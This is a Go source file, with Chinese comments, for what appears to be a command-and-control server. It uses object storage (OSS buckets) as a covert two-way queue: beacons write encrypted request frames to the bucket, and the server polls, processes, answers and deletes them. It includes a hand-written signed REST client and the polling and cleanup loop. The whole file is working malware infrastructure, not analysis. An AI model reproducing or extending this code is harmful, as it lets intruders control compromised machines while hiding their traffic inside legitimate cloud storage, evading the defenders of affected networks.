package c2center

// oss 载体(契约 §18.4):对象存储做双向队列。
//   - beacon 侧:写 <prefix>/<uid>/req/<nc> 对象(一帧密文),轮询读
//     <prefix>/<uid>/resp/<nc>,读完即删;
//   - 平台侧:每监听器一个 goroutine,按配置间隔(默认 3s)ListObjectsV2(prefix)
//     发现请求对象 → 处理核(wait=false,不挂起)→ 写 resp 对象 → 删 req 对象;
//     重复消费由信封 nc 防重放兜底。
//
// OSS REST 客户端手写(V1 HMAC-SHA1 签名,仅标准库,不引 SDK):
//   Authorization: OSS <AccessKeyId>:<base64(hmac-sha1(SecretKey, StringToSign))>
//   StringToSign = VERB\n Content-MD5\n Content-Type\n Date\n CanonicalizedResource
//   CanonicalizedResource = /<bucket>/<key>[?排序后的查询串]
//
// AK/SK 经 transport_config_enc(secretbox)密封入库,本文件不落盘、不打日志。

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"
)

// errOSSNotExist 是对象不存在(404)的哨兵错误。
var errOSSNotExist = errors.New("oss: 对象不存在")

// ossClient 是手写 OSS V1 REST 客户端(virtual-host 风格:
// <scheme>://<bucket>.<endpoint>/<key>)。
type ossClient struct {
	httpc     *http.Client
	scheme    string
	endpoint  string // 不含 scheme 的裸域名
	bucket    string
	ak, sk    string
	pathStyle bool // true = <host>/<bucket>/<key>;false = <bucket>.<host>/<key>
}

// newOSSClient 构造客户端。endpoint 允许带 scheme(http://127.0.0.1:9000 或裸域名,
// 默认 https)。
func newOSSClient(cfg *TransportConfig) (*ossClient, error) {
	if strings.TrimSpace(cfg.Endpoint) == "" || strings.TrimSpace(cfg.Bucket) == "" ||
		strings.TrimSpace(cfg.AccessKey) == "" || strings.TrimSpace(cfg.SecretKey) == "" {
		return nil, fmt.Errorf("oss 传输配置不完整(需要 endpoint/bucket/access_key/secret_key)")
	}
	ep := strings.TrimSpace(cfg.Endpoint)
	scheme := "https"
	if i := strings.Index(ep, "://"); i >= 0 {
		scheme = ep[:i]
		ep = ep[i+3:]
	}
	ep = strings.TrimRight(ep, "/")
	return &ossClient{
		httpc:     &http.Client{Timeout: 30 * time.Second},
		scheme:    scheme,
		endpoint:  ep,
		bucket:    strings.TrimSpace(cfg.Bucket),
		ak:        strings.TrimSpace(cfg.AccessKey),
		sk:        cfg.SecretKey,
		pathStyle: cfg.PathStyle,
	}, nil
}

// ossGMT 是 RFC1123 GMT(Date 头)。
func ossGMT(t time.Time) string { return t.UTC().Format(http.TimeFormat) }

// sign 计算 V1 签名串。StringToSign 的 CanonicalizedResource 含排序后的查询串
// (对象操作无查询串;List 的 list-type/prefix/max-keys 等全量参与签名)。
func (c *ossClient) sign(method, key, query, date string, body []byte) string {
	cres := "/" + c.bucket + "/"
	if key != "" {
		cres += key
	}
	if query != "" {
		cres += "?" + query
	}
	ss := method + "\n" +
		"\n" + // Content-MD5(不用)
		"application/octet-stream\n" +
		date + "\n" +
		cres
	mac := hmac.New(sha1.New, []byte(c.sk))
	_, _ = mac.Write([]byte(ss))
	return "OSS " + c.ak + ":" + base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

// do 发一个已签名请求并返回响应 body(调用方决定 404 语义)。
func (c *ossClient) do(method, key, query string, body []byte) ([]byte, int, error) {
	u := c.scheme + "://" + c.endpoint + "/"
	if c.pathStyle {
		u += c.bucket + "/"
	}
	if key != "" {
		u += key
	}
	if query != "" {
		u += "?" + query
	}
	var rd io.Reader
	if body != nil {
		rd = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rd)
	if err != nil {
		return nil, 0, err
	}
	date := ossGMT(time.Now())
	req.Header.Set("Date", date)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Authorization", c.sign(method, key, query, date, body))
	resp, err := c.httpc.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, frameMaxBytes+1))
	if err != nil {
		return nil, resp.StatusCode, err
	}
	if len(data) > frameMaxBytes {
		return nil, resp.StatusCode, fmt.Errorf("oss 对象超长")
	}
	return data, resp.StatusCode, nil
}

// Put 写对象(信封帧即对象内容)。
func (c *ossClient) Put(key string, body []byte) error {
	_, code, err := c.do(http.MethodPut, key, "", body)
	if err != nil {
		return err
	}
	if code < 200 || code >= 300 {
		return fmt.Errorf("oss put %s: http %d", key, code)
	}
	return nil
}

// Get 读对象;不存在返回 errOSSNotExist。
func (c *ossClient) Get(key string) ([]byte, error) {
	data, code, err := c.do(http.MethodGet, key, "", nil)
	if err != nil {
		return nil, err
	}
	if code == http.StatusNotFound {
		return nil, errOSSNotExist
	}
	if code < 200 || code >= 300 {
		return nil, fmt.Errorf("oss get %s: http %d", key, code)
	}
	return data, nil
}

// Delete 删对象(OSS 删不存在对象也返回 2xx,幂等)。
func (c *ossClient) Delete(key string) error {
	_, code, err := c.do(http.MethodDelete, key, "", nil)
	if err != nil {
		return err
	}
	if code < 200 || code >= 300 {
		if code != http.StatusNotFound { // 删不存在对象按幂等成功处理
			return fmt.Errorf("oss delete %s: http %d", key, code)
		}
	}
	return nil
}

// ossObject 是 ListObjectsV2 的一条摘要(扫描用 key + last_modified)。
type ossObject struct {
	Key          string
	LastModified time.Time
}

// List 按 prefix 列对象(ListObjectsV2;签名串带排序后的全量查询参数)。
func (c *ossClient) List(prefix string, maxKeys int) ([]ossObject, error) {
	q := url.Values{}
	q.Set("list-type", "2")
	q.Set("prefix", prefix)
	if maxKeys <= 0 {
		maxKeys = 200
	}
	q.Set("max-keys", fmt.Sprintf("%d", maxKeys))
	keys := make([]string, 0, len(q))
	for k := range q {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	query := strings.Join(keys, "&") // url.Values.Encode 会转义,这里值都安全,手工拼保持排序原文

	data, code, err := c.do(http.MethodGet, "", query, nil)
	if err != nil {
		return nil, err
	}
	if code < 200 || code >= 300 {
		return nil, fmt.Errorf("oss list: http %d", code)
	}
	return parseOSSList(data), nil
}

// parseOSSList 极简解析 ListObjectsV2 XML(仅 <Contents> 的 Key/LastModified,
// 不引 XML 库的嵌套展开;payload 侧同口径)。
func parseOSSList(data []byte) []ossObject {
	out := []ossObject{}
	for _, block := range splitOSSBlocks(data, "<Contents>", "</Contents>") {
		key := ossXMLText(block, "Key")
		if key == "" {
			continue
		}
		obj := ossObject{Key: key}
		if ts := ossXMLText(block, "LastModified"); ts != "" {
			if t, err := time.Parse(time.RFC3339, ts); err == nil {
				obj.LastModified = t
			}
		}
		out = append(out, obj)
	}
	return out
}

// splitOSSBlocks 按标签切出所有块内容。
func splitOSSBlocks(data []byte, open, close string) [][]byte {
	var blocks [][]byte
	for {
		i := bytes.Index(data, []byte(open))
		if i < 0 {
			return blocks
		}
		data = data[i+len(open):]
		j := bytes.Index(data, []byte(close))
		if j < 0 {
			return blocks
		}
		blocks = append(blocks, data[:j])
		data = data[j+len(close):]
	}
}

// ossXMLText 取块内 <tag>text</tag> 的 text(XML 转义的最小集还原)。
func ossXMLText(block []byte, tag string) string {
	blocks := splitOSSBlocks(block, "<"+tag+">", "</"+tag+">")
	if len(blocks) == 0 {
		return ""
	}
	s := string(blocks[0])
	r := strings.NewReplacer("&lt;", "<", "&gt;", ">", "&quot;", `"`, "&apos;", "'", "&amp;", "&")
	return r.Replace(s)
}

// ---- 平台侧扫描循环 ----

// startOSS 拉起 oss 载体:无端口监听,起对象扫描 goroutine。
func (s *channelServer) startOSS() error {
	cfg, err := s.transportConfig()
	if err != nil {
		return err
	}
	if cfg == nil {
		return fmt.Errorf("oss 监听器缺少传输配置(transport_config)")
	}
	cli, err := newOSSClient(cfg)
	if err != nil {
		return err
	}
	prefix := cfg.ossPrefix(s.l.URLPath)
	interval := cfg.scanInterval()
	go s.runOSS(cli, prefix, interval)
	return nil
}

// runOSS 平台侧扫描循环:ListObjectsV2 → 逐个处理 req 对象 → 写 resp → 删 req。
// ctx 取消或监听器停止时退出。处理失败不重试(nc 防重放保证重扫安全,下一轮再试)。
func (s *channelServer) runOSS(cli *ossClient, prefix string, interval time.Duration) {
	for {
		select {
		case <-s.ctx.Done():
			return
		case <-time.After(interval):
		}
		if err := s.scanOSSOnce(cli, prefix); err != nil {
			s.mgr.logf("oss 监听器 «%s»(#%d) 扫描失败: %v", s.l.Name, s.l.ID, err)
		}
	}
}

// scanOSSOnce 跑一轮扫描:处理全部 req 对象(单轮上限 64,防单轮过载);
// 顺手清理滞留超 1h 的孤儿 resp 对象(beacon 崩溃未删的残骸)。
func (s *channelServer) scanOSSOnce(cli *ossClient, prefix string) error {
	objs, err := cli.List(prefix+"/", 200)
	if err != nil {
		return err
	}
	now := time.Now()
	processed := 0
	for _, obj := range objs {
		switch {
		case strings.Contains(obj.Key, "/req/"):
			if processed >= 64 {
				continue
			}
			if err := s.processOSSRequest(cli, obj.Key); err != nil {
				if !errors.Is(err, errOSSNotExist) {
					s.mgr.logf("oss 请求对象 %s 处理失败: %v", obj.Key, err)
				}
				continue
			}
			processed++
		case strings.Contains(obj.Key, "/resp/"):
			// 孤儿响应:对应 req 已不在且滞留超 1h → 清理。
			if !obj.LastModified.IsZero() && now.Sub(obj.LastModified) > time.Hour {
				reqKey := strings.Replace(obj.Key, "/resp/", "/req/", 1)
				if _, gerr := cli.Get(reqKey); errors.Is(gerr, errOSSNotExist) {
					_ = cli.Delete(obj.Key)
				}
			}
		}
	}
	return nil
}

// processOSSRequest 处理一个请求对象:读 → 处理核(wait=false)→ 写响应对象 → 删请求。
func (s *channelServer) processOSSRequest(cli *ossClient, reqKey string) error {
	body, err := cli.Get(reqKey)
	if err != nil {
		return err
	}
	out := s.processEnvelope(body, frameCtx{wait: false})
	respKey := strings.Replace(reqKey, "/req/", "/resp/", 1)
	if out.code != 0 {
		// 认证/协议错误:与其它载体同哲学,不回明文;直接删请求丢弃。
		return cli.Delete(reqKey)
	}
	if err := cli.Put(respKey, out.body); err != nil {
		return err
	}
	return cli.Delete(reqKey)
}
